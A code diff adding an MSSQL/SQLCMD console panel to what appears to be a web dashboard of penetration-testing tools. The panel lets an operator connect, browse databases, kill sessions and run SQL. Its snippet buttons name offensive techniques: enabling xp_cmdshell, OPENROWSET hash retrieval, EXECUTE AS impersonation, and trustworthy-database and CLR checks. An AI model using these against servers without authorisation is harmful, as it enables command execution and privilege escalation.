@@ -694,6 +694,52 @@ textarea.fi{resize:vertical;min-height:48px}
 .rpt-tool-pill{font-size:10px;background:#0a1a0c;color:var(--g);border:1px solid #1a3a1a;padding:1px 6px;border-radius:2px;letter-spacing:1px;white-space:nowrap}
 .rpt-sbox{background:#020403;border:1px solid #163019;color:var(--txt);font-family:inherit;font-size:12px;padding:4px 8px;border-radius:2px;outline:none;width:220px}
 .rpt-sbox:focus{border-color:#254530;box-shadow:0 0 6px rgba(0,255,136,.08)}
+
+/* ─── MSSQL PANEL ────────────────────────────────────── */
+.ms-conn-grid{display:grid;grid-template-columns:2fr 70px 1.4fr 1.2fr 1fr auto;gap:6px;align-items:end;margin-bottom:8px}
+@media(max-width:1100px){.ms-conn-grid{grid-template-columns:repeat(2,1fr)}}
+.ms-status-bar{display:flex;align-items:center;gap:8px;padding:5px 10px;border-radius:3px;border:1px solid #162516;background:#020403;margin-bottom:8px;flex-wrap:wrap;min-height:34px}
+.ms-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;background:#3a1010;transition:all .3s}
+.ms-dot.connected{background:var(--g);box-shadow:0 0 6px rgba(0,255,136,.7)}
+.ms-dot.error{background:var(--red);box-shadow:0 0 5px rgba(255,79,79,.6)}
+.ms-dot.running{background:var(--yellow);animation:msPulse .7s ease-in-out infinite}
+@keyframes msPulse{0%,100%{opacity:1}50%{opacity:.3}}
+.ms-state-lbl{font-size:12px;color:var(--mut);letter-spacing:1px;transition:color .2s}
+.ms-state-lbl.connected{color:var(--g)}
+.ms-state-lbl.error{color:var(--red)}
+.ms-state-lbl.running{color:var(--yellow)}
+.ms-conn-btns{display:flex;gap:4px;flex-wrap:wrap;margin-left:auto}
+.ms-qbtn{background:#030604;border:1px solid var(--brd);color:var(--mut);font-family:inherit;font-size:11px;padding:4px 10px;border-radius:2px;cursor:pointer;letter-spacing:.8px;transition:all .12s;white-space:nowrap}
+.ms-qbtn:hover{border-color:#2d6040;color:var(--g2);background:#070f08}
+.ms-qbtn.act{border-color:var(--g);color:var(--g);background:#071009;box-shadow:0 0 6px rgba(0,255,136,.1)}
+.ms-qbtn.danger{border-color:#4a1818;color:#cc5050}
+.ms-qbtn.danger:hover{border-color:var(--red);color:var(--red);background:#180505}
+.ms-selects-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px;padding:6px 9px;background:#020403;border:1px solid var(--brd);border-radius:3px}
+.ms-sel-lbl{font-size:11px;color:var(--mut);letter-spacing:1px;white-space:nowrap;flex-shrink:0}
+.ms-sel{background:var(--input-bg);border:1px solid var(--brd);color:var(--txt);font-family:inherit;font-size:12px;padding:3px 6px;border-radius:2px;outline:none;transition:border .12s;min-width:90px}
+.ms-sel:focus{border-color:var(--g)}
+.ms-section{border:1px solid #0d1a0f;background:#020403;border-radius:4px;padding:8px;margin-bottom:7px}
+.ms-sec-title{font-size:10px;color:var(--mut);letter-spacing:2.5px;text-transform:uppercase;margin-bottom:6px;display:flex;align-items:center;gap:5px}
+.ms-sec-title::before{content:'';width:4px;height:4px;border-radius:50%;background:var(--g);box-shadow:0 0 5px rgba(0,255,136,.5);flex-shrink:0}
+.ms-btns{display:flex;flex-wrap:wrap;gap:4px}
+.ms-pass-wrap{position:relative;display:flex;align-items:stretch}
+.ms-pass-wrap input{flex:1;padding-right:30px}
+.ms-eye{position:absolute;right:6px;top:50%;transform:translateY(-50%);background:none;border:none;color:var(--dim);cursor:pointer;font-size:13px;padding:0;line-height:1;z-index:1;transition:color .1s}
+.ms-eye:hover{color:var(--g)}
+.ms-conn-str{font-size:12px;color:var(--cyan);background:#010408;border:1px solid #163040;border-radius:3px;padding:6px 9px;word-break:break-all;margin-top:5px;font-family:'JetBrains Mono',monospace;letter-spacing:.3px}
+.ms-info-row{display:flex;gap:5px;flex-wrap:wrap;margin-top:5px}
+.ms-pill{font-size:11px;padding:2px 7px;border:1px solid var(--brd);border-radius:2px;color:var(--mut);background:#020403;letter-spacing:.5px}
+.ms-pill.ok{color:var(--g);border-color:#1a3a20;background:#020703}
+.ms-pill.err{color:var(--red);border-color:#3a1010;background:#060202}
+.ms-pill.warn{color:var(--yellow);border-color:#4a3c08;background:#070600}
+.ms-inrow{display:flex;gap:5px;align-items:flex-end;flex-wrap:wrap;margin-top:5px}
+.ms-inrow input.fi{max-width:90px}
+.ms-tabs-bar{display:flex;flex-wrap:wrap;border-bottom:1px solid var(--brd);margin-bottom:8px;gap:0}
+.ms-tab{font-size:11px;padding:4px 10px;color:var(--mut);cursor:pointer;border-bottom:2px solid transparent;letter-spacing:1px;transition:all .1s;user-select:none;white-space:nowrap}
+.ms-tab:hover{color:var(--g2);background:#060d07}
+.ms-tab.on{color:var(--g);border-bottom-color:var(--g)}
+.ms-tab-content{display:none}
+.ms-tab-content.on{display:block}
 </style>
 </style>
 </head>
@@ -834,6 +880,7 @@ textarea.fi{resize:vertical;min-height:48px}
     <div class="s-item" onclick="sw('nuclei',this)"><div class="s-dot"></div><span class="s-icon">⬡</span>NUCLEI</div>
     <div class="s-item" onclick="sw('encoder',this)"><div class="s-dot"></div><span class="s-icon">⊞</span>ENCODER <span class="s-badge">NEW</span></div>
     <div class="s-item" onclick="sw('gitdumper',this)"><div class="s-dot"></div><span class="s-icon">⬡</span>GIT-DUMPER</div>
+    <div class="s-item" onclick="sw('mssql',this);mssqlInit()"><div class="s-dot"></div><span class="s-icon">⊗</span>SQLCMD <span class="s-badge" style="color:var(--cyan);border-color:#0a2030">MSSQL</span></div>
   </div>
 
   <!-- SYSTEM -->
@@ -3796,6 +3843,315 @@ textarea.fi{resize:vertical;min-height:48px}
       </div>
     </div>
     <div class="out-content" id="gd-out-c"></div>
+  </div>
+</div>
+
+<!-- ══ MSSQL / SQLCMD ══ -->
+<div id="p-mssql" class="panel">
+  <div class="pt">SQLCMD <span class="ptd">— SQL Server automated console</span>
+    <span style="margin-left:auto;font-size:11px;color:var(--cyan);border:1px solid #163040;padding:2px 7px;border-radius:2px;letter-spacing:1px">MSSQL</span>
+  </div>
+  <div id="mssql-val" class="val-msg"></div>
+
+  <!-- ── CONNECTION FORM ── -->
+  <div class="ms-conn-grid">
+    <div class="ig"><div class="lbl">HOST</div><input class="fi" id="ms-host" placeholder="192.168.1.10" oninput="mssqlConnStr()"></div>
+    <div class="ig"><div class="lbl">PORT</div><input class="fi" id="ms-port" placeholder="1433" oninput="mssqlConnStr()"></div>
+    <div class="ig"><div class="lbl">DATABASE</div><input class="fi" id="ms-db" placeholder="master (opcional)" oninput="mssqlConnStr()"></div>
+    <div class="ig"><div class="lbl">USER</div><input class="fi" id="ms-user" placeholder="sa" oninput="mssqlConnStr()"></div>
+    <div class="ig">
+      <div class="lbl">PASSWORD</div>
+      <div class="ms-pass-wrap">
+        <input class="fi" id="ms-pass" type="password" placeholder="••••••••" autocomplete="new-password">
+        <button class="ms-eye" id="ms-eye-btn" onclick="mssqlTogglePass()" title="Mostrar/ocultar password">👁</button>
+      </div>
+    </div>
+    <div class="ig" style="align-self:end">
+      <button class="rbtn" id="ms-connect-btn" onclick="mssqlConnect()" style="padding:5px 14px;font-size:12px;letter-spacing:1px">▶ CONNECT</button>
+    </div>
+  </div>
+
+  <!-- ── STATUS BAR ── -->
+  <div class="ms-status-bar">
+    <div class="ms-dot" id="ms-dot"></div>
+    <span class="ms-state-lbl" id="ms-state-lbl">DISCONNECTED</span>
+    <div class="ms-conn-btns">
+      <button class="ms-qbtn" onclick="mssqlTestConn()" title="Test Connection">⬡ TEST</button>
+      <button class="ms-qbtn" onclick="mssqlConnect()" title="Connect &amp; load databases">▶ CONNECT</button>
+      <button class="ms-qbtn" onclick="mssqlDisconnect()" title="Clear session">◼ DISCONNECT</button>
+      <button class="ms-qbtn" onclick="mssqlRunAction('server_version','Version')" title="@@VERSION">VER</button>
+      <button class="ms-qbtn" onclick="mssqlRunAction('current_user','User')" title="SYSTEM_USER">USER</button>
+      <button class="ms-qbtn" onclick="mssqlRunAction('current_database','DB')" title="DB_NAME()">DB</button>
+      <button class="ms-qbtn" onclick="mssqlRunAction('server_time','Time')" title="GETDATE()">TIME</button>
+    </div>
+  </div>
+
+  <!-- ── SELECTS ROW (auto-populated on connect) ── -->
+  <div class="ms-selects-row" id="ms-selects-row">
+    <span class="ms-sel-lbl">DATABASE:</span>
+    <select class="ms-sel" id="ms-sel-db" onchange="mssqlOnDbChange()">
+      <option value="">-- conectar primero --</option>
+    </select>
+    <span class="ms-sel-lbl">SCHEMA:</span>
+    <select class="ms-sel" id="ms-sel-schema" onchange="mssqlOnSchemaChange()">
+      <option value="">-- seleccionar DB --</option>
+    </select>
+    <span class="ms-sel-lbl">TABLE:</span>
+    <select class="ms-sel" id="ms-sel-table" onchange="mssqlOnTableChange()">
+      <option value="">-- seleccionar schema --</option>
+    </select>
+    <button class="ms-qbtn act" onclick="mssqlLoadTableInfo()" title="Cargar info de tabla seleccionada">⬇ TABLE INFO</button>
+  </div>
+
+  <!-- ── TABS ── -->
+  <div class="ms-tabs-bar">
+    <div class="ms-tab on"  id="mst-conn"   onclick="mssqlTab('conn')">CONNECTION</div>
+    <div class="ms-tab"     id="mst-db"     onclick="mssqlTab('db')">DATABASES</div>
+    <div class="ms-tab"     id="mst-tbl"    onclick="mssqlTab('tbl')">TABLES</div>
+    <div class="ms-tab"     id="mst-data"   onclick="mssqlTab('data')">DATA</div>
+    <div class="ms-tab"     id="mst-admin"  onclick="mssqlTab('admin')">ADMIN</div>
+    <div class="ms-tab"     id="mst-diag"   onclick="mssqlTab('diag')">DIAG</div>
+    <div class="ms-tab"     id="mst-sql"    onclick="mssqlTab('sql')">CUSTOM SQL</div>
+  </div>
+
+  <!-- ═══ TAB: CONNECTION ═══ -->
+  <div class="ms-tab-content on" id="ms-tab-conn">
+    <div class="ms-section">
+      <div class="ms-sec-title">SERVER INFO</div>
+      <div class="ms-btns">
+        <button class="ms-qbtn" onclick="mssqlRunAction('server_version','Server Version')">⬡ Server Version</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('current_user','Current User')">◉ Current User</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('current_database','Current Database')">◈ Current Database</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('server_time','Server Time')">◎ Server Time</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('active_db','Active DB')">▶ Active DB</button>
+      </div>
+    </div>
+    <div class="ms-section" id="ms-connstr-section">
+      <div class="ms-sec-title">CONNECTION STRING</div>
+      <div class="ms-conn-str" id="ms-connstr-display">— completa los campos de conexion —</div>
+      <div class="ms-btns" style="margin-top:5px">
+        <button class="ms-qbtn" onclick="mssqlCopyConnStr()">⧉ COPY CONN STRING</button>
+        <button class="ms-qbtn" onclick="mssqlCopyCmd()">⧉ COPY SQLCMD</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ TAB: DATABASES ═══ -->
+  <div class="ms-tab-content" id="ms-tab-db">
+    <div class="ms-section">
+      <div class="ms-sec-title">DATABASE OPERATIONS</div>
+      <div class="ms-btns">
+        <button class="ms-qbtn" onclick="mssqlRunAction('list_databases','List Databases')">⬡ List Databases</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('db_size','Database Size')">◈ DB Size</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('active_db','Active Database')">◉ Active DB</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('show_schemas','Show Schemas')">≡ Show Schemas</button>
+      </div>
+    </div>
+    <div class="ms-section">
+      <div class="ms-sec-title">USE DATABASE</div>
+      <div class="ms-inrow">
+        <select class="ms-sel" id="ms-use-db-sel" style="min-width:160px">
+          <option value="">-- seleccionar --</option>
+        </select>
+        <button class="ms-qbtn act" onclick="mssqlUseDatabase()">▶ USE DB</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ TAB: TABLES ═══ -->
+  <div class="ms-tab-content" id="ms-tab-tbl">
+    <div class="ms-section">
+      <div class="ms-sec-title">TABLE OPERATIONS  <span style="color:var(--dim);font-size:10px;margin-left:4px">— usa los selects de arriba para elegir schema/tabla</span></div>
+      <div class="ms-btns">
+        <button class="ms-qbtn" onclick="mssqlRunAction('list_tables','List Tables')">≡ List All Tables</button>
+        <button class="ms-qbtn" onclick="mssqlListBySchema()">≡ Tables by Schema</button>
+        <button class="ms-qbtn" onclick="mssqlDescribeTable()">◈ Describe Table</button>
+        <button class="ms-qbtn" onclick="mssqlShowColumns()">▦ Show Columns</button>
+        <button class="ms-qbtn" onclick="mssqlPrimaryKeys()">⚿ Primary Keys</button>
+        <button class="ms-qbtn" onclick="mssqlForeignKeys()">⬡ Foreign Keys</button>
+        <button class="ms-qbtn" onclick="mssqlIndexes()">◎ Indexes</button>
+        <button class="ms-qbtn" onclick="mssqlCountRows()">∑ Count Rows</button>
+        <button class="ms-qbtn" onclick="mssqlPreview(10)">▶ Preview TOP 10</button>
+        <button class="ms-qbtn" onclick="mssqlPreview(50)">▶ Preview TOP 50</button>
+        <button class="ms-qbtn" onclick="mssqlPreview(100)">▶ Preview TOP 100</button>
+      </div>
+    </div>
+    <div class="ms-section">
+      <div class="ms-sec-title">SEARCH TABLE BY NAME</div>
+      <div class="ms-inrow">
+        <input class="fi" id="ms-search-tbl" placeholder="nombre_tabla" style="max-width:220px">
+        <button class="ms-qbtn act" onclick="mssqlSearchTable()">⬡ SEARCH</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ TAB: DATA ═══ -->
+  <div class="ms-tab-content" id="ms-tab-data">
+    <div class="ms-section">
+      <div class="ms-sec-title">SELECT TOP N</div>
+      <div class="ms-inrow">
+        <span style="font-size:12px;color:var(--mut)">TOP</span>
+        <input class="fi" id="ms-topn" value="25" style="max-width:70px" type="number" min="1" max="5000">
+        <button class="ms-qbtn act" onclick="mssqlSelectTopN()">▶ RUN SELECT TOP</button>
+      </div>
+    </div>
+    <div class="ms-section">
+      <div class="ms-sec-title">PAGINATED RESULTS</div>
+      <div class="ms-inrow">
+        <span style="font-size:12px;color:var(--mut)">PAGE</span>
+        <input class="fi" id="ms-pg-page" value="1" style="max-width:60px" type="number" min="1">
+        <span style="font-size:12px;color:var(--mut)">SIZE</span>
+        <input class="fi" id="ms-pg-size" value="50" style="max-width:70px" type="number" min="1" max="5000">
+        <button class="ms-qbtn" onclick="mssqlPrevPage()">◀ PREV</button>
+        <button class="ms-qbtn act" onclick="mssqlPaginatedRun()">▶ RUN PAGE</button>
+        <button class="ms-qbtn" onclick="mssqlNextPage()">NEXT ▶</button>
+      </div>
+    </div>
+    <div class="ms-section">
+      <div class="ms-sec-title">SEARCH TEXT IN TABLE</div>
+      <div class="ms-inrow">
+        <input class="fi" id="ms-srch-col" placeholder="column_name" style="max-width:160px">
+        <input class="fi" id="ms-srch-txt" placeholder="texto a buscar" style="max-width:200px">
+        <button class="ms-qbtn act" onclick="mssqlSearchText()">⬡ SEARCH</button>
+      </div>
+    </div>
+    <div class="ms-section" style="border-color:#1a3a1a">
+      <div class="ms-sec-title" style="color:var(--yellow)">⬡ GLOBAL SEARCH — ALL DBs</div>
+      <div style="font-size:11px;color:var(--mut);margin-bottom:6px">Busca un valor en <b style="color:var(--fg)">todas las columnas de texto</b> de <b style="color:var(--fg)">todas las bases de datos</b> accesibles. Devuelve TOP 5 coincidencias por columna.</div>
+      <div class="ms-inrow">
+        <input class="fi" id="ms-search-all-term" placeholder="valor a buscar  (ej: admin, claude, 1234...)" style="flex:1">
+        <button class="ms-qbtn act" id="ms-search-all-btn" style="background:rgba(255,204,0,.08);border-color:var(--yellow);color:var(--yellow)" onclick="mssqlSearchAll()">⬡ SEARCH ALL DBs</button>
+        <button class="ms-qbtn" id="ms-search-all-stop" style="display:none;background:rgba(255,68,68,.08);border-color:#ff4444;color:#ff4444" onclick="mssqlStopSearchAll()">■ STOP</button>
+      </div>
+      <div id="ms-search-all-status" style="font-size:11px;color:var(--mut);margin-top:5px;min-height:16px"></div>
+    </div>
+    <div class="ms-section">
+      <div class="ms-sec-title">EXPORT</div>
+      <div class="ms-btns">
+        <button class="ms-qbtn" onclick="mssqlExportCSV()">⬇ Export Table CSV</button>
+        <button class="ms-qbtn" onclick="mssqlCopyOutput()">⧉ Copy Output</button>
+      </div>
+      <div class="ms-export-hint" id="ms-export-hint"></div>
+    </div>
+  </div>
+
+  <!-- ═══ TAB: ADMIN ═══ -->
+  <div class="ms-tab-content" id="ms-tab-admin">
+    <div class="ms-section">
+      <div class="ms-sec-title">ACTIVE MONITORING</div>
+      <div class="ms-btns">
+        <button class="ms-qbtn" onclick="mssqlRunAction('active_connections','Active Connections')">◉ Active Connections</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('sessions','Sessions')">≡ Sessions</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('locks','Locks')">⚿ Locks</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('running_queries','Running Queries')">▶ Running Queries</button>
+      </div>
+    </div>
+    <div class="ms-section">
+      <div class="ms-sec-title">SESSION MANAGEMENT</div>
+      <div class="ms-inrow">
+        <input class="fi" id="ms-kill-sid" placeholder="session_id" style="max-width:120px" type="number" min="1">
+        <button class="ms-qbtn danger" onclick="mssqlKillSession()">☠ KILL SESSION</button>
+      </div>
+      <div style="font-size:11px;color:var(--red);margin-top:4px;opacity:.7">⚠ Pedira confirmacion antes de ejecutar KILL</div>
+    </div>
+    <div class="ms-section">
+      <div class="ms-sec-title">USERS &amp; PERMISSIONS</div>
+      <div class="ms-btns">
+        <button class="ms-qbtn" onclick="mssqlRunAction('db_users','Database Users')">◉ DB Users</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('permissions','Permissions')">⚿ Permissions</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ TAB: DIAG ═══ -->
+  <div class="ms-tab-content" id="ms-tab-diag">
+    <div class="ms-section">
+      <div class="ms-sec-title">CONNECTIVITY</div>
+      <div class="ms-btns">
+        <button class="ms-qbtn" onclick="mssqlPingHost()">⬡ Ping Host</button>
+        <button class="ms-qbtn" onclick="mssqlCheckPort()">◎ Check Port</button>
+      </div>
+      <div id="ms-diag-port-result" class="ms-info-row"></div>
+    </div>
+    <div class="ms-section">
+      <div class="ms-sec-title">ENVIRONMENT</div>
+      <div class="ms-btns">
+        <button class="ms-qbtn" onclick="mssqlCheckSqlcmd()">✓ Check sqlcmd</button>
+        <button class="ms-qbtn" onclick="mssqlCheckODBC()">✓ Check ODBC Driver</button>
+        <button class="ms-qbtn" onclick="mssqlRunAction('timeout_test','Timeout Test')">⏱ Timeout Test</button>
+      </div>
+      <div id="ms-diag-env-result" class="ms-info-row"></div>
+    </div>
+    <div class="ms-section">
+      <div class="ms-sec-title">PREREQUISITES — INSTALL SQLCMD</div>
+      <div style="font-size:11px;color:var(--dim);margin-bottom:6px;line-height:1.6">
+        sqlcmd se instala en <code style="color:var(--cyan)">/opt/mssql-tools18/bin/sqlcmd</code><br>
+        El panel lo detecta automaticamente en ese path.
+      </div>
+      <div class="ms-btns" style="margin-bottom:6px">
+        <button class="ms-qbtn" onclick="mssqlInstallStep('repo')">1. Add Microsoft Repo</button>
+        <button class="ms-qbtn" onclick="mssqlInstallStep('install')">2. Install mssql-tools18</button>
+        <button class="ms-qbtn" onclick="mssqlInstallStep('path')">3. Add to PATH</button>
+        <button class="ms-qbtn act" onclick="mssqlInstallStep('all')">⬇ INSTALL ALL</button>
+        <button class="ms-qbtn" onclick="mssqlCheckSqlcmd()">✓ Verify</button>
+      </div>
+      <div style="font-size:11px;color:var(--dim)">Requiere permisos root. Usa el terminal si el servidor no corre como root.</div>
+    </div>
+    <div class="ms-section">
+      <div class="ms-sec-title">LAST ERROR</div>
+      <div id="ms-last-error" style="font-size:12px;color:var(--dim);font-style:italic">Sin errores registrados</div>
+    </div>
+  </div>
+
+  <!-- ═══ TAB: CUSTOM SQL ═══ -->
+  <div class="ms-tab-content" id="ms-tab-sql">
+    <div class="ms-section">
+      <div class="ms-sec-title">QUERY EDITOR  <span style="color:var(--red);font-size:10px;margin-left:4px">⚠ Pedira confirmacion en comandos destructivos</span></div>
+      <textarea class="fi" id="ms-custom-sql" style="min-height:100px;font-size:13px;resize:vertical;margin-bottom:6px" placeholder="SELECT @@VERSION;
+SELECT * FROM sys.databases;
+-- Escribe cualquier SQL aqui..."></textarea>
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
+        <button class="rbtn" id="ms-sql-run" onclick="mssqlRunCustomSQL()" style="font-size:12px;padding:6px 16px">▶ EJECUTAR SQL</button>
+        <button class="sbtn" id="ms-sql-stop" onclick="mssqlStop()" disabled style="font-size:12px;padding:5px 14px">■ STOP</button>
+        <button class="ms-qbtn" onclick="mssqlClearSQL()">⌫ CLEAR</button>
+        <button class="ms-qbtn" onclick="mssqlCopySQL()">⧉ COPY SQL</button>
+      </div>
+      <div class="sdiv" style="margin-top:10px">QUICK SQL SNIPPETS</div>
+      <div class="ms-btns" style="margin-top:4px">
+        <button class="ms-qbtn" onclick="mssqlSnippet('version')">@@VERSION</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('user')">SYSTEM_USER</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('databases')">sys.databases</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('tables')">INFORMATION_SCHEMA.TABLES</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('columns')">INFORMATION_SCHEMA.COLUMNS</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('xp_cmdshell')">xp_cmdshell</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('linked')">sys.linked_servers</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('sp_who2')">sp_who2</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('openrowset')">OPENROWSET hash</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('bulkinsert')">BULK INSERT</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('enable_xp')">Enable xp_cmdshell</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('impersonate')">EXECUTE AS USER</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('users_all')">sys.server_principals</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('sa_check')">SA Login Check</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('clr_check')">CLR Enabled Check</button>
+        <button class="ms-qbtn" onclick="mssqlSnippet('trustworthy')">Trustworthy Databases</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── OUTPUT CONSOLE ── -->
+  <div class="out-area" id="mssql-out" style="display:block">
+    <div class="out-hdr">
+      <span class="out-title">OUTPUT — SQLCMD / MSSQL</span>
+      <div style="display:flex;gap:5px">
+        <button class="kbtn" onclick="mssqlStop()" id="ms-stop-btn">■ STOP</button>
+        <button class="kbtn" onclick="mssqlCopyOutput()">⧉ COPY</button>
+        <button class="kbtn" onclick="mssqlExportTXT()" title="Descargar output como .txt">⬇ TXT</button>
+        <button class="kbtn" onclick="mssqlDownloadCSV()" title="Exportar tabla seleccionada a CSV (descarga)">⬇ CSV</button>
+        <button class="kbtn" onclick="mssqlExportPDF()" title="Imprimir / Guardar como PDF">⬇ PDF</button>
+        <button class="kbtn" onclick="clrOut('mssql-out')">CLEAR</button>
+      </div>
+    </div>
+    <div class="out-content" id="mssql-out-c" style="max-height:clamp(200px,38vh,550px)"></div>
   </div>
 </div>
 
@@ -14191,6 +14547,1113 @@ document.addEventListener('keydown', e => { if (e.key === 'Escape') rptClose(); 
 document.addEventListener('click',   e => { if (e.target.id === 'rpt-modal') rptClose(); });
 // Badge on load
 setTimeout(_rptUpdateBadge, 1500);
+
+/* ══════════════════════════════════════════════════════
+   MSSQL / SQLCMD — automated SQL Server console
+   ══════════════════════════════════════════════════════ */
+
+const _msConn  = { host:'', port:'1433', database:'', username:'', password:'' };
+let   _msState = 'disconnected';  // disconnected | connected | error | running
+let   _msActiveDb = '';
+let   _msLastError = '';
+let   _msPgPage = 1;
+
+// ── State helpers ─────────────────────────────────────────────────────────────
+
+function mssqlGetConn() {
+  _msConn.host     = (document.getElementById('ms-host')?.value || '').trim();
+  const rawPort    = (document.getElementById('ms-port')?.value || '').trim();
+  _msConn.port     = rawPort || '1433';
+  _msConn.database = (document.getElementById('ms-db')?.value || '').trim();
+  _msConn.username = (document.getElementById('ms-user')?.value || '').trim();
+  _msConn.password = document.getElementById('ms-pass')?.value || '';
+}
+
+function mssqlActiveConn() {
+  const c = Object.assign({}, _msConn);
+  if (_msActiveDb) c.database = _msActiveDb;
+  return c;
+}
+
+function mssqlSetState(state) {
+  _msState = state;
+  const dot = document.getElementById('ms-dot');
+  const lbl = document.getElementById('ms-state-lbl');
+  if (!dot || !lbl) return;
+  dot.className = 'ms-dot ' + state;
+  lbl.className = 'ms-state-lbl ' + state;
+  const labels = {
+    disconnected: 'DISCONNECTED',
+    connected:    'CONNECTED',
+    error:        'ERROR',
+    running:      'RUNNING...',
+  };
+  lbl.textContent = labels[state] || state.toUpperCase();
+
+  const cb = document.getElementById('ms-connect-btn');
+  if (cb) {
+    if (state === 'running') {
+      cb.classList.add('running');
+      cb.textContent = '● RUNNING';
+    } else {
+      cb.classList.remove('running');
+      cb.textContent = '▶ CONNECT';
+    }
+  }
+}
+
+function mssqlLog(text, cls) {
+  appendOut('mssql-out-c', text, cls || '');
+  const area = document.getElementById('mssql-out');
+  if (area) area.style.display = 'block';
+}
+
+function mssqlConnStr() {
+  mssqlGetConn();
+  const el = document.getElementById('ms-connstr-display');
+  if (!el) return;
+  const h = _msConn.host || 'HOST';
+  const p = _msConn.port;   // already defaulted to 1433 in mssqlGetConn
+  const u = _msConn.username || 'USER';
+  const d = _msConn.database ? ` -d ${_msConn.database}` : '';
+  el.textContent = `/opt/mssql-tools18/bin/sqlcmd -S ${h},${p}${d} -U ${u} -P *** -C`;
+}
+
+function mssqlCopyConnStr() {
+  mssqlGetConn();
+  const h = _msConn.host || 'HOST';
+  const p = _msConn.port || '1433';
+  const u = _msConn.username || 'USER';
+  const d = _msConn.database ? `;Database=${_msConn.database}` : '';
+  const s = `Server=${h},${p}${d};User Id=${u};Password=***;TrustServerCertificate=True;`;
+  navigator.clipboard.writeText(s).catch(() => {});
+  showVal('mssql-val', 'Connection string copiada (password omitido)', 'ok');
+}
+
+function mssqlCopyCmd() {
+  const el = document.getElementById('ms-connstr-display');
+  if (el) navigator.clipboard.writeText(el.textContent).catch(() => {});
+}
+
+function mssqlTogglePass() {
+  const inp = document.getElementById('ms-pass');
+  const btn = document.getElementById('ms-eye-btn');
+  if (!inp) return;
+  inp.type = inp.type === 'password' ? 'text' : 'password';
+  if (btn) btn.textContent = inp.type === 'password' ? '👁' : '🙈';
+}
+
+function mssqlInit() {
+  mssqlConnStr();
+}
+
+// ── Tab switching ─────────────────────────────────────────────────────────────
+
+function mssqlTab(id) {
+  document.querySelectorAll('#p-mssql .ms-tab').forEach(t => t.classList.remove('on'));
+  document.querySelectorAll('#p-mssql .ms-tab-content').forEach(c => c.classList.remove('on'));
+  const tab = document.getElementById('mst-' + id);
+  const con = document.getElementById('ms-tab-' + id);
+  if (tab) tab.classList.add('on');
+  if (con) con.classList.add('on');
+}
+
+// ── Core runner ───────────────────────────────────────────────────────────────
+
+async function mssqlExec(sql, label, dangerous) {
+  mssqlGetConn();
+  const conn = mssqlActiveConn();
+
+  if (!conn.host || !conn.username) {
+    showVal('mssql-val', 'Completa host y usuario', 'err');
+    return;
+  }
+  if (!conn.password) {
+    showVal('mssql-val', 'Password requerido', 'err');
+    return;
+  }
+  if (dangerous && !confirm(`⚠ OPERACION DESTRUCTIVA\n\nSQL: ${sql.substring(0,100)}\n\n¿Continuar?`)) return;
+
+  // Kill existing job
+  if (activeJobs['mssql']) {
+    const j = activeJobs['mssql'];
+    if (j.es) j.es.close();
+    if (j.job_id) fetch(API + '/kill/' + j.job_id, { method:'POST' }).catch(() => {});
+    delete activeJobs['mssql'];
+  }
+
+  mssqlSetState('running');
+  mssqlLog('', 'sep');
+  mssqlLog(`── ${label || 'SQL'} ──`, 'sys');
+
+  const stopBtn = document.getElementById('ms-sql-stop');
+  const runBtn  = document.getElementById('ms-sql-run');
+  if (stopBtn) stopBtn.disabled = false;
+  if (runBtn)  { runBtn.classList.add('running'); runBtn.textContent = '● RUNNING'; }
+
+  try {
+    const resp = await fetch(API + '/mssql/run', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ conn, sql }),
+    });
+    const data = await resp.json();
+    if (data.error) {
+      _msLastError = data.error;
+      mssqlSetState('error');
+      mssqlLog('ERROR: ' + data.error, 'err');
+      document.getElementById('ms-last-error').textContent = data.error;
+      if (stopBtn) stopBtn.disabled = true;
+      if (runBtn)  { runBtn.classList.remove('running'); runBtn.textContent = '▶ EJECUTAR SQL'; }
+      return;
+    }
+
+    mssqlLog('$ ' + data.cmd_display, 'cmd');
+
+    const es = new EventSource(API + '/stream/' + data.job_id);
+    activeJobs['mssql'] = { job_id: data.job_id, es };
+    updJobs();
+
+    es.onmessage = (ev) => {
+      const msg = JSON.parse(ev.data);
+      if (msg.type === 'output') {
+        const line = stripAnsi(msg.data).trimEnd();
+        if (line) mssqlLog(line);
+      } else if (msg.type === 'done') {
+        const ok = msg.code === 0;
+        mssqlSetState(ok ? 'connected' : 'error');
+        mssqlLog('[exit: ' + msg.code + ']', ok ? 'ok' : 'err');
+        if (!ok) {
+          const raw = (rawBuffers['mssql'] || []).join('\n');
+          _msLastError = raw.substring(0, 300) || 'Exit code ' + msg.code;
+          const lerr = document.getElementById('ms-last-error');
+          if (lerr) lerr.textContent = _msLastError;
+        }
+        delete activeJobs['mssql'];
+        updJobs();
+        es.close();
